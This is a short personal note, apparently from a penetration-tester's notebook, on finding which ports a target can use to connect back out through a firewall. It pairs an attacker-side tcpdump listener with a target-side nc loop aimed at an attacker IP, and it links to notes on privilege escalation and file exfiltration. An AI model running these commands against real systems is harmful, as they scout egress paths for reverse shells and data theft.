# scan for ports to connect back on through firewall
Attacker
```bash
sudo tcpdump -i tun0 'tcp[tcpflags] == tcp-syn'
```
Target
```bash
for i in {1..1000}; do nc -w 1 192.168.119.221 $i; echo $i; done
```

` zet/20221003151258/README.md `

# Related

- [20221006025356](/zet/20221006025356/README.md) linux
- [20221003151210](/zet/20221003151210/README.md) linux privilege escalation
- [20221003150906](/zet/20221003150906/README.md) linux enumeration quick commands transfer / download files with just bash receive
- [20221003150904](/zet/20221003150904/README.md) linux enumeration quick commands exfiltrate files bash pipe tcp
- [20221003150894](/zet/20221003150894/README.md) linux enumeration quick commands file transfer with cat herefiles

Tags:

    
